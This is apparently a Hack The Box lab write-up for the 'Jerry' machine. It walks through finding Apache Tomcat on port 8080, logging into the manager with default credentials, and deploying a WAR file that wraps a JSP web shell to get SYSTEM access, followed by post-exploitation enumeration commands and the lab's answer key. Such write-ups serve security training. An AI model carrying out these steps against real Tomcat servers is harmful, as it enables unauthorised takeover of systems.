# 🚀 Hack The Box: Jerry (Windows, Easy)

**by [a1i3n37x](https://github.com/a1i3n37x) · [Alien37.com](https://www.alien37.com)**

---

## ✨ Intro — Jerry

This is a box about awareness.

It’s a chance to practice recognizing what’s in front of you — and knowing what that means. You’ll learn to spot a vulnerable service, test assumptions carefully, and respond with the right kind of payload for the environment.

Jerry is built on fundamentals. There’s no trick, no twist. Just a web service running with too much power and no defenses.

What you’ll get from this box isn’t a challenge in complexity — it’s clarity.

---

## 📡 Reconnaissance — Jerry 

Jerry only exposes a single port. No SSH, no RDP — just 8080.

```bash
nmap -sC -sV -Pn 10.10.10.95 -oN jerry-nmap.txt
```

No ping because HTB drops ICMP a lot. Here’s what came back:

```bash
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

The Tomcat version is **7.0.88** — old enough to raise concerns.

### 🧠 Tomcat Versioning — What to Watch For

- 7.x often ships with exposed Manager interfaces
- SSL and strong auth not enforced by default
- WAR deployment usually enabled
- If running as SYSTEM? Full compromise possible

Opened in browser:

```bash
http://10.10.10.95:8080
```

Got the default Tomcat page — misconfiguration confirmed.

---

## 🔍 Scanning & Enumeration — Jerry

Checked for Manager and Host Manager apps:

```
/manager/html
/host-manager/html
```

Prompted for HTTP Basic Auth — good sign. Used:

[Better Tomcat Default Cred List](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt)

**Success:**

```text
tomcat:s3cret
```

Logged into **Web Application Manager**. Gained access to:

- Deployed apps
- Undeploy/reload
- Upload WAR files

---

## 💣 Gaining Access — Jerry

Used WAR upload form with a `msfvenom` payload — no shell.

Turns out: msfvenom payloads don’t always work on Tomcat.

### 🧠 Why msfvenom WARs Fail

- Embeds a binary inside `.jsp`
- Tomcat expects Java, not binaries
- Better: JSP web shell

Used a JSP shell from [tennc/webshell](https://github.com/tennc/webshell).

**WAR File Structure:**

```
browser-shell/
├── Browser.jsp
└── WEB-INF/
    └── web.xml
```

**web.xml**

```xml
<web-app>
  <servlet>
    <servlet-name>browser</servlet-name>
    <jsp-file>/Browser.jsp</jsp-file>
  </servlet>
  <servlet-mapping>
    <servlet-name>browser</servlet-name>
    <url-pattern>/browser</url-pattern>
  </servlet-mapping>
</web-app>
```

Deployed and hit:

```bash
http://10.10.10.95:8080/browser
```

**Shell loaded — `whoami` returned `nt authority\SYSTEM`**.

---

## 🧬 Post-Exploitation — Jerry

Already SYSTEM. No escalation needed.

```bash
hostname
ver
echo %cd%
```

Was in:

```text
C:\apache-tomcat-7.0.88\webapps
```

Searched for flags.

### ⚠️ SYSTEM Access = Full Compromise

- Read/write everything
- Dump creds
- Add users
- Pivot freely

### 🧪 Post-Ex Commands

```bash
whoami /priv
net user
net localgroup administrators
tasklist /v
ipconfig /all
```

---

## 🪙 Flag Capture — Jerry

Inside `C:\Users\Administrator\Desktop`:

```bash
2 for the price of 1.txt
```

**Both flags inside** — no separation.

---

## 🧭 Guided Mode Answers — Jerry

<details>
<summary><strong>Which TCP port is open on the remote host?</strong></summary>
8080
</details>

<details>
<summary><strong>Which web server is running on the remote host?</strong></summary>
Apache Tomcat
</details>

<details>
<summary><strong>Which relative path on the webserver leads to the Web Application Manager?</strong></summary>
/manager/html
</details>

<details>
<summary><strong>Valid username and password?</strong></summary>
tomcat:s3cret
</details>

<details>
<summary><strong>Which file type can be uploaded and deployed?</strong></summary>
.war
</details>

<details>
<summary><strong>Submit the flag on the user's desktop.</strong></summary>
Both flags are in: `2 for the price of 1.txt`
</details>

---

## 🧠 Lessons Learned — Jerry

- Tomcat on 8080 is a red flag
- Default creds are still everywhere
- JSP shells > reverse shells on older servers
- Always check privilege level early
- Don’t overcomplicate when the path is clear

---

## 🎓 CEH Summary — Jerry

**CEH Domains:**

- **Reconnaissance**: Nmap discovery of Tomcat on 8080
- **Enumeration**: Validated `/manager/html`, default creds
- **Exploitation**: WAR file upload with JSP shell
- **Privilege Escalation**: No escalation — direct SYSTEM access
- **Post-Exploitation**: Enumeration, flag capture, cleanup

**Key Takeaways:**

- Validate versions and exposed panels
- Default creds = still gold
- JSP shells offer control where reverse shells fail
- Always check your access level before escalating

> **“Two flags, one shell, and zero resistance. Jerry didn’t stand a chance. 👽”**

---

*Written by [a1i3n37x](https://github.com/a1i3n37x) · Hack The Box | [Alien37.com](https://alien37.com) 👽*
